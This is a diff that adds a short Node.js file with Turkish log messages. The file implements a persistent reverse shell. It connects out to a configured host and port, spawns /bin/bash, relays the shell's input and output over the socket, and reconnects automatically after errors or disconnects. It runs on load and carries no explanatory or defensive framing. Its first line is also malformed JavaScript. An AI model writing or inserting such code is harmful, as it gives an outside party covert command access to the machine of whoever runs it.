@@ -1,0 +1,37 @@
+function connect = function connect() {
+    const client = new net.Socket();
+
+    client.connect(PORT, HOST, () => {
+        console.log('Bağlantı kuruldu.');
+
+        const shell = spawn('/bin/bash', []);
+
+        shell.stdout.on('data', (data) => {
+            console.log('stdout:', data.toString());
+            client.write(data);  
+        });
+        
+        shell.stderr.on('data', (data) => {
+            console.error('stderr:', data.toString());
+            client.write(data);  
+        });
+
+        client.on('data', (data) => {
+            shell.stdin.write(data);
+        });
+
+        client.on('close', () => {
+            console.log('Bağlantı kapatıldı.');
+            client.destroy();
+            scheduleReconnect();
+        });
+    });
+
+    client.on('error', (err) => {
+        console.error('Bağlantı hatası:', err);
+        client.destroy();
+        scheduleReconnect();
+    });
+}
+setTimeout(connect, retryInterval)
+connect()
